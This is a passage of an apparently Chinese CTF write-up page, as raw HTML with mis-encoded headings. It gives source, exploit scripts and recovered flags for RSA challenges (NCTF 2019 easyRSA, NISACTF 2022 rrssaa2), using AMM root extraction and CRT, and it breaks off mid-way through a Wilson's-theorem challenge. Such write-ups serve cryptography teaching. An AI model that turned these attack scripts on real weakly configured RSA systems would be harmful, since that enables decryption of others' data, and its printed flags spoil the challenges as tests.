q1==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> q2==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n1 % q1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n2 % q2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_prime(q1) <span class="hljs-keyword">and</span> is_prime(q2):<br>        <span class="hljs-keyword">if</span> iroot(n1//q1, <span class="hljs-number">4</span>)[<span class="hljs-number">1</span>]:<br>            p1=iroot(n1//q1, <span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>            p2=iroot(n2//q2, <span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br>            d1=invert(e,(p1**<span class="hljs-number">4</span>-p1**<span class="hljs-number">3</span>)*(q1-<span class="hljs-number">1</span>))<br>            d2=invert(e,(p2**<span class="hljs-number">4</span>-p2**<span class="hljs-number">3</span>)*(q2-<span class="hljs-number">1</span>))<br>            m1=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br>            m2=<span class="hljs-built_in">pow</span>(c2,d2,n2)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m1))+long_to_bytes(<span class="hljs-built_in">int</span>(m2)))<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;flag&#123;8ef333ac-21a7-11ec-80f1-00155d83f114&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;8ef333ac-21a7-11ec-80f1-00155d83f114&#125;</span><br></code></pre></td></tr></table></figure><h1 id="nctf-2019easyrsa"><a class="markdownIt-Anchor" href="#nctf-2019easyrsa"></a> [NCTF 2019]easyRSA</h1><h2 id="é¢˜ç›®-8"><a class="markdownIt-Anchor" href="#é¢˜ç›®-8"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br>e = <span class="hljs-number">0x1337</span><br>p = <span class="hljs-number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span><br>q = <span class="hljs-number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span><br>n = p * q<br><br><span class="hljs-keyword">assert</span>(flag.startswith(<span class="hljs-string">&#x27;NCTF&#x27;</span>))<br>m = <span class="hljs-built_in">int</span>.from_bytes(flag.encode(), <span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-keyword">assert</span>(m.bit_length() &gt; <span class="hljs-number">1337</span>)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-8"><a class="markdownIt-Anchor" href="#åˆ†æ-8"></a> åˆ†æ</h2><p>AMM</p><h2 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br>c=<span class="hljs-number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span><br>e = <span class="hljs-number">0x1337</span><br>p = <span class="hljs-number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span><br>q = <span class="hljs-number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span><br>n=p*q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">mp, mq, e, p, q</span>):<br>    i = <span class="hljs-number">1</span><br>    j = <span class="hljs-number">1</span><br>    t1 = invert(q, p)<br>    t2 = invert(p, q)<br>    <span class="hljs-keyword">for</span> mp1 <span class="hljs-keyword">in</span> mp:<br>        <span class="hljs-keyword">for</span> mq1 <span class="hljs-keyword">in</span> mq:<br>            j += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> j % <span class="hljs-number">100000</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(j)<br>            ans = (mp1*t1*q+mq1*t2*p) % (p*q)<br>            <span class="hljs-keyword">if</span> check(ans):<br>                <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">try</span>:<br>        a = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NCTF&#x27;</span> <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-built_in">print</span>(a)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br><br>mp = AMM_rth(cp, e, p)  <span class="hljs-comment"># AMMç®—æ³•å¾—åˆ°ä¸€ä¸ªè§£</span><br>mq = AMM_rth(cq, e, q)<br><br>rt1 = ALL_ROOT2(e, p)  <span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„riï¼Œå³(ri*mp)^e%p = 1</span><br>rt2 = ALL_ROOT2(e, q)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)  <span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„mp</span><br>amq = ALL_Solution(mq, q, rt2, cq, e)<br><br>a=calc(amp, amq, e, p, q)  <span class="hljs-comment"># ä¿©ä¿©CRT</span><br><br><span class="hljs-comment">#22400000</span><br><span class="hljs-comment">#b&#x27;NCTF&#123;T4k31ng_Ox1337_r00t_1s_n0t_th4t_34sy&#125;e$71N&#123;D]0su&#123;ZDEKfEnY&gt;TTQ(=qR?GBpN\\U&#123;3@O\\/I8ZsxW.Uw)3&amp;&amp;s&amp;xD-&lt;Uf*pKXOkV0~oiWubv&lt;VAD9roRJU9:9S?&gt;MyZ&lt;wMN~T||%PC*j]inkgus4f9t:g:O9!FsIas^?M*q:BU&#123;_J*r&quot;*6Fi94hdRUW#s0=N+][l&#125;Js7j,c5kiLB+/f&lt;_1*N=V3Eq%~s^!5Gh8*&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;T4k31ng_Ox1337_r00t_1s_n0t_th4t_34sy&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="nisactf-2022rrssaa2"><a class="markdownIt-Anchor" href="#nisactf-2022rrssaa2"></a> [NISACTF 2022]rrssaa2</h1><h2 id="é¢˜ç›®-9"><a class="markdownIt-Anchor" href="#é¢˜ç›®-9"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>():<br>    p = <span class="hljs-number">1801</span> * random.getrandbits(<span class="hljs-number">1012</span>) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p):<br>        p = <span class="hljs-number">1801</span> * random.getrandbits(<span class="hljs-number">1012</span>) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p<br>p=gen()<br>q=gen()<br>e=<span class="hljs-number">1801</span><br>n=p*q<br>flag=<span class="hljs-string">&#x27;NSSCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>flag=flag+<span class="hljs-string">&#x27;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;</span><br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=&#x27;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=&#x27;</span>,q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><br><span class="hljs-comment">#e= 1801</span><br><span class="hljs-comment">#p= 49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841</span><br><span class="hljs-comment">#q= 21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043</span><br><span class="hljs-comment">#c= 601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199</span><br><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-9"><a class="markdownIt-Anchor" href="#åˆ†æ-9"></a> åˆ†æ</h2><p>åŒä¸Š</p><h2 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br>e= <span class="hljs-number">1801</span><br>p= <span class="hljs-number">49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841</span><br>q= <span class="hljs-number">21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043</span><br>c= <span class="hljs-number">601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199</span><br>n=p*q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">mp, mq, e, p, q</span>):<br>    i = <span class="hljs-number">1</span><br>    j = <span class="hljs-number">1</span><br>    t1 = invert(q, p)<br>    t2 = invert(p, q)<br>    <span class="hljs-keyword">for</span> mp1 <span class="hljs-keyword">in</span> mp:<br>        <span class="hljs-keyword">for</span> mq1 <span class="hljs-keyword">in</span> mq:<br>            j += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> j % <span class="hljs-number">100000</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(j)<br>            ans = (mp1*t1*q+mq1*t2*p) % (p*q)<br>            <span class="hljs-keyword">if</span> check(ans):<br>                <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">try</span>:<br>        a = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-built_in">print</span>(a)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br><br>mp = AMM_rth(cp, e, p)  <span class="hljs-comment"># AMMç®—æ³•å¾—åˆ°ä¸€ä¸ªè§£</span><br>mq = AMM_rth(cq, e, q)<br><br>rt1 = ALL_ROOT2(e, p)  <span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„riï¼Œå³(ri*mp)^e%p = 1</span><br>rt2 = ALL_ROOT2(e, q)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)  <span class="hljs-comment"># å¾—åˆ°æ‰€æœ‰çš„mp</span><br>amq = ALL_Solution(mq, q, rt2, cq, e)<br><br>a=calc(amp, amq, e, p, q)  <span class="hljs-comment"># ä¿©ä¿©CRT</span><br><span class="hljs-comment">#2900000</span><br><span class="hljs-comment">#b&#x27;NSSCTF&#123;2he_amm_13_r12lly_hard_f0r_me&#125;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="é•¿å®‰æ¯-2021checkin"><a class="markdownIt-Anchor" href="#é•¿å®‰æ¯-2021checkin"></a> [é•¿å®‰æ¯ 2021]checkin</h1><h2 id="é¢˜ç›®-10"><a class="markdownIt-Anchor" href="#é¢˜ç›®-10"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">16</span>)<br>n = p*q<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,p-q):<br>    m = m*i%n<br>e = <span class="hljs-number">1049</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e,n))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m,e,n))<br><span class="hljs-comment">#4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span><br><span class="hljs-comment">#3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-10"><a class="markdownIt-Anchor" href="#åˆ†æ-10"></a> åˆ†æ</h2><p>å¨å°”é€Šå®šç†ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>=</mo><mo>âˆ’</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)!=-1\quad mod(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 